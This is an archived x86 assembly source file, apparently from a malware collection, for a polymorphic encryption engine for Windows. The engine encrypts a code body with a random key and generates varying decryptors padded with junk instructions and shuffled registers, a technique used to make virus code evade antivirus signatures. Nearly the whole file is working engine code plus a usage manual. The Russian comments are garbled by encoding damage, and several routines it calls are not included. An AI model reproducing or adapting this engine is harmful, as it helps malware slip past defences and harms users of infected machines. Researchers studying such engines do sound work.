; ------------------------------------------------------------
; name      Cryptor
; type      research
; cve       —
; year      unknown
; os        Multi
; authors   unknown
; source    vxunderground
; archived  vxunderground, krisyotam (2026)
; notes     —
; ------------------------------------------------------------
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;                       [POLYMORPHIC GENERATOR OF SHIT V. 0.4]                 ;
;                                                                              ;
;		      #########        ########      ########                  ;
;		      ###########    ##########    ##########                  ;
;		      ##### ######  ######   ##   ######   ##                  ;
;		      #####  #####  #####         #####                        ;
;		      #####  #####  #####          ########                    ;
;		      ###########   ##### ######     ########                  ;
;		      #########     ##### ######         #####                 ;
;		      #####         #####    ###         #####                 ;
;		      #####          ###########  ###########                  ;
;		      #####            ##### ###  #########                    ;
;                                                                              ;
;                                  FOR MS WINDOWS                              ;
;                                                                              ;
;                                     BY SL0N                                  ;
;------------------------------------------------------------------------------;
;                                    MANUAL:                                   ;
; BUFFER FOR ENCRYPTED CODE + DECRYPTORS  -> EDI                               ;
; START OF CODE 	                  -> EAX                               ;
; SIZE OF CODE  	                  -> ECX                               ;
;                                                                              ;
; CALL MORPH                                                                   ;
;                                                                              ;
; SIZE OF ENCRYPTED CODE + DECRYPTORS     -> ECX                               ;
; BUFFER WITH ENCRYPTED CODE + DECRYPTORS -> EDI			       ;
;------------------------------------------------------------------------------;
; (+) DO NOT USE WIN API                                                       ;
; (+) EASY TO USE                                                              ;
; (+) GENERATE GARBAGE INSTRUCTIONS (1,2,3,4,5,6 BYTES)                        ;
; (+) USE DELTA OFFSET                                                         ;
; (+) USE X87 INSTRUCTIONS                                                     ;
; (+) IT CREATES VARIABLE DECRYPTOR SIZE                                       ;
; (+) RANDOMLY CHANGE REGISTERS IN INSTRUCTIONS                                ;
; (+) RANDOM 32 BIT ENCRYPTION ALGORITHM (ADD/SUB/XOR)                         ;
; (+) RANDOM NUMBER OF DECRYPTORS                                              ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
morph:
                push	esi ebp                    ; ��������� �������� 

		call	delta0                     ; 
delta0:                                            ; ��������� 
		pop	ebp                        ; ������ ��������
		sub	ebp,offset delta0          ;

		push	eax                        ; ����� � ���� eax
decr_number:                                       
		mov	eax,40                     ; ���������� ��������� �����
		call	brandom32                  ; � ��������� 0..30
		test	eax,eax                    ; ���� ����� ����� 0, �� ���
		jz	decr_number                ; ��� �� ��������
		mov	ebx,eax                    ; �������� ����� � ebx
		pop	eax                        ; ��������������� eax
multi_decr:		                           
		mov	edx,edi
		call	polym                      ; 
		mov	eax,edx                    ; 
		add	edi,ecx                    ; ���������� ������� 
		dec	ebx                        ; �����������, �������
		test	ebx,ebx                    ; �������� � �������� ebx
		jnz	multi_decr                 ;

		sub	edi,ecx                    ; ������������
		
		pop	ebp esi                    ; ��������������� ��������
                ret                                ; ������� �� ������������
;------------------------------------------------------------------------------;
polym:
		push	ebp edi esi ebx            ; ��������� ��������

		mov	[ebp+sz_code],ecx          ; ������� ��������� ������
		mov	[ebp+begin_code],eax       ; �� ��������� � ����������
		mov	[ebp+buff],edx             ;
		mov	edi,edx	                   ;
;------------------------------------------------------------------------------;
		call	len_gen                    ; �������� ��������� ����
		mov	[ebp+sz_decr],40
		add	[ebp+sz_decr],ecx          ; ��������� ����� ������ �
                                                   ; ������� ����������

		call	reg_mutate		   ; �������� ��������, �������
		                                   ; ����� �������������� �
						   ; ����������

		mov	ecx,[ebp+len+0]            ; � ���������� ������ ������
		call	garbage                    ; �������� ����������

		mov	al,0e8h			   ; ���������� ���������
		stosb                              ; ����������: call $+5
		xor	eax,eax                    ;
		stosd                              ; 

		mov	ecx,[ebp+len+4]            ; ���������� ����� ������
		call	garbage                    ; �������� ����������

	        mov	al,58h                     ; ���������� ���������
		add	al,bh                      ; ���������� ����������:
		stosb	                           ; pop reg1

		mov	ecx,[ebp+len+8]		   ; ���������� ��������
		call	garbage                    ; ����������

		                                   ; ���������� ���������
		mov	al,81h                     ; ���������� ����������:
		stosb                              ; add reg1,sz_decr-len[0]
		mov	al,0c0h                    ; 
		add	al,bh                      ; ����� ������� reg1 �����
		stosb                              ; ��������� �� ������
		                                   ; ��������������� ����
		mov	eax,[ebp+sz_decr]          ;
		sub	eax,[ebp+len]	           ;
		sub	eax,9			   ; 
		stosd				   ;

		mov	ecx,[ebp+len+12]	   ; ���������� ��������
		call	garbage                    ; ����������

		mov	al,8bh			   ; ���������� ����������:
		stosb                              ; mov reg2,reg1
		                                   ;
		mov	al,bl                      ; � ��� reg2 ����� �����
		shl	al,3			   ; �������������� ���
		add	al,0c0h                    ; ���������
		add	al,bh                      ;
		stosb

		mov	ecx,[ebp+len+16]	   ; ���������� ��������
		call	garbage                    ; ����������

		mov	al,81h                     ;
		stosb                              ; 
		mov	al,0c0h                    ;
		add	al,bl                      ;
		stosb                              ;
			                           ; ���������� ����������:
		mov	eax,[ebp+sz_code]          ; add reg2,size_code
		inc	eax
		stosd                              ;

		mov	ecx,[ebp+len+20]	   ; ���������� ��������
		call	garbage                    ; ����������

		mov	al,81h                     ;
		stosb                              ; ���������� ���������
		mov	al,0c0h                    ; ����������: add reg1,4
		add	al,bh                      ;
		stosb                              ;
		                                   ;
		mov	eax,4                      ;
		stosd                              ;

		mov	ecx,[ebp+len+24]           ; ���������� ���������
		call	garbage                    ; ������ ������

		call	random32                   ;
		mov	[ebp+key2],eax             ; ��������� ���� �����������

		lea	eax,[ebp+next]             ; ����� � ���� ��������
		push	eax                        ; �� ����� next
						   ; �������� ���� �� ���
		                                   ; ��������� �����������
		mov	eax,3                      ; ��������� �������.
		call	brandom32                  ;
		                                   ; ��������� ����������� �
		cmp	al,1                       ; �������������:
		je	enc_add32                  ;
		                                   ; 1) XOR
		cmp	al,2                       ; 2) ADD
		je	enc_sub32                  ; 3) SUB
enc_xor32:
		                                   
		mov	al,81h                     ;
		stosb                              ; ���������� ����������:
		mov	al,30h                     ; xor [reg1],key_decrypt
		add	al,bh                      ;
		stosb                              ;
		mov	eax,[ebp+key2]
		stosd

		push	edi                        ; 
		lea	edi,[ebp+crypt_n]          ; 
		mov	al,33h                     ; � � ����� ������ ��������
		stosb                              ; �������� ����������� 
		pop	edi                        ;
		ret                                ; ������� �� ����� next
enc_add32:
		mov	al,81h                     ; 
		stosb                              ; ���������� ����������:
		mov	al,bh                      ; add [reg1],key_decrypt
		stosb                              ;

		mov	eax,[ebp+key2]
		stosd

		push	edi                        ; 
		lea	edi,[ebp+crypt_n]          ; 
		mov	al,2bh                     ; � � ����� ������ ��������
		stosb                              ; �������� ����������� 
		pop	edi                        ;
		ret                                ; ������� �� ����� next

enc_sub32:
		mov	al,81h                     ;
		stosb                              ; ���������� ���������
		mov	al,028h                    ; ����������:
		add	al,bh                      ; sub [reg1],key_decrypt
		stosb                              ;

		mov	eax,[ebp+key2]
		stosd

		push	edi                        ;
		lea	edi,[ebp+crypt_n]          ; � � ����� ������ ������
		mov	al,03h                     ; �������� �����������
		stosb                              ;
		pop	edi                        ;
		ret                                ; ������� �� ����� next
;------------------------------------------------------------------------------;
next: 
		mov	ecx,[ebp+len+28]           ; ���������� ���������
		call	garbage                    ; ������ ������
                                                   
		mov	al,3bh                     ; 
		stosb                              ;
			                           ;
		xor	eax,eax                    ;
		mov	al,bh                      ; ���������� ����������:
		shl	al,3                       ; cmp reg1,reg2
		add	al,0c0h                    ;
		add	al,bl                      ;
		stosb                              ;
;------------------------------------------------------------------------------;
		mov	ax,820fh                   ; 
		stosw                              ; 
		xor	eax,eax                    ;
		dec	eax                        ; ���������� ����������:
		mov	ecx,7*4                    ; jb decrypt
		sub	eax,[ebp+len+ecx]          ;
		mov	ecx,6*4                    ;
		sub	eax,[ebp+len+ecx]          ;
		sub	eax,19                     ;  
		stosd                              ;

	        mov	ecx,[ebp+len+32]           ; ���������� ��������
		call	garbage                    ; ����������
;------------------------------------------------------------------------------;
		mov	ecx,[ebp+sz_code]          ;
		mov	esi,[ebp+begin_code]       ;
		add	ecx,esi                    ;
encrypt:                                           ;
		lodsd                              ; �������� ���� ��� ������
crypt_n:                                           ; � ������ ����������
		xor	eax,[ebp+key2]             ;
		stosd                              ;
		cmp	esi,ecx                    ;
		jl	encrypt                    ;

		mov	edx,[ebp+buff]             ; ��������� ��������
		mov	ecx,[ebp+sz_code]          ; ������������
		add	ecx,[ebp+sz_decr]          ;

		pop	ebx esi edi ebp            ; �������������� ��������
		ret                                ; � ������� �� ���������
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;     		      GARBAGE LENGTH GENERATOR SUBROUTINE                      ;
;------------------------------------------------------------------------------;
;			          [ IN ]				       ;
;                                                                              ;
;          		    NO INPUT IN SUBROTINE                              ;
;------------------------------------------------------------------------------;
;			          [ OUT ]				       ;
;						 			       ;
;               	 LENGTH OF ALL GARBAGE -> ECX                          ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
len_gen:                                           ; ������������ ���������
                                                   ; ���� ��� ��������
						   ; ����������
		xor	ecx,ecx                    ; �������� esi � ecx
		xor	esi,esi                    ;
loop1:                                             ;
		mov	eax,100                    ;
		call	brandom32                  ; �������� ���������
			                           ; ����, ������ �����
		mov	[ebp+len+esi],eax          ; ��������� 0..100
		add	ecx,eax                    ;
		add	esi,4                      ;
		cmp	esi,36                     ;
		jne	loop1                      ;
		ret                                ; ������� �� ������������
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
;			  REGISTER MUTATOR SUBROUTINE		               ;
;------------------------------------------------------------------------------;
;			             [ IN ]				       ;
;                                                                              ;
;          		     NO INPUT IN SUBROTINE                             ;
;------------------------------------------------------------------------------;
;			             [ OUT ]				       ;
;									       ;
;                         USES REGISTER N1 -> BH (0..7)                        ;
;                         USES REGISTER N2 -> BL (0..7)                        ;
;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
reg_mutate:                                         
                                                   ; ������������ ���������
generate1:                                         ; ��������� ��� ����������

		mov	eax,8                      ; �������� ��������� �����
		call	brandom32                  ; � ��������� 0..7
		cmp	al,00000100b               ; ���������� ��� �������� 
		je	generate1                  ; ����� esp
		cmp	al,00000101b               ; ���������� ��� �������� 
		je	generate1                  ; ����� ebp
		mov	bh,al                      ; ��������� ����������
		                                   ; �������
generate2:
		mov	eax,8                      ; �������� ��������� �����
		call	brandom32                  ; � ��������� 0..7
		cmp	al,bh                      ; �� ������ ���� ����
		je	generate2                  ; ���������� ���������
		cmp	al,00000100b               ; ���������� ��� �������� 
		je	generate2                  ; ����� esp
		mov	bl,al                      ; ��������� ����������
		                                   ; �������
		ret                                ; ������� �� ������������
;------------------------------------------------------------------------------;
sz_decr         dd	0                  	   ; 
begin_code      dd	0                          ; ������ ����������� ���
st_code         dd	0                          ; ���������� ������ 
sz_code         dd	0                          ; ����������
buff		dd	0			   ;
key2            dd	0                          ;
;------------------------------------------------------------------------------;
	len	dd	0,0,0,0,0,0,0,0,0          ; ����� ��� �������� ����
;------------------------------------------------------------------------------;
